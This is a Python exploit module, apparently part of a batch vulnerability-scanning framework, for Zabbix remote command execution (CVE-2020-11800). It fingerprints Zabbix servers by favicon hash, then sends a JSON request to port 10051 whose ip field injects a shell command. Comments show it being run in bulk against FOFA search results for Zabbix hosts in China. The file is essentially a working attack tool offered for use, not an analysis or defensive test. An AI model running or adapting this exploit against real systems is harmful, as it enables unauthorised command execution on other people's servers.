# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-15 11:58

import hashlib
import json
from urllib.parse import urlparse

from async_timeout import timeout
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: app="ZABBIX-监控系统"
# python batch.py -m exploit.web.Zabbix.unauth_rce -cs -fs "app=\"ZABBIX-监控系统\" && country=\"CN\""

class Script(BaseScript):
    name = 'Zabbix'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = 'CVE-2020-11800'
        # 来源
        self.refer = 'https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800'
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/']
        # 进度条
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['0fbe700fd7d07ec8d30ef8b3ac261484']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Zabbix Finger', url))
                                return {'name': 'Zabbix Finger', 'url': url, 'software': 'Zabbix'}
        except Exception:
            return None

    async def exec(self):
        try:
            with timeout(7):
                url = urlparse(f'http://{self.target}').netloc.split(':')[0]
                # 这是检测只写了端口10051，要不然为了准确，可以通过端口10000-10500来进行遍历探测
                reader, writer = await asyncio.open_connection(url, 10051)
                writer.write(json.dumps({"request": "active checks", "host": "vulhub", "ip": "ffff:::;touch /tmp/success2"}).encode())
                await writer.drain()
                data = await reader.read(1024)
                writer.close()
                await asyncio.sleep(2)
                if data and b'failed' in data:
                    tqdm.write(Fore.RED + '[{}] {}'.format('Zabbix RCE', url))
                    return {'name': 'Zabbix RCE', 'url': url, 'software': 'Zabbix'}
        except Exception:
            return None
        finally:
            try:
                writer.close()
            except NameError:
                pass

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('http://192.168.4.137:8080/', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('192.168.4.137:8080', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
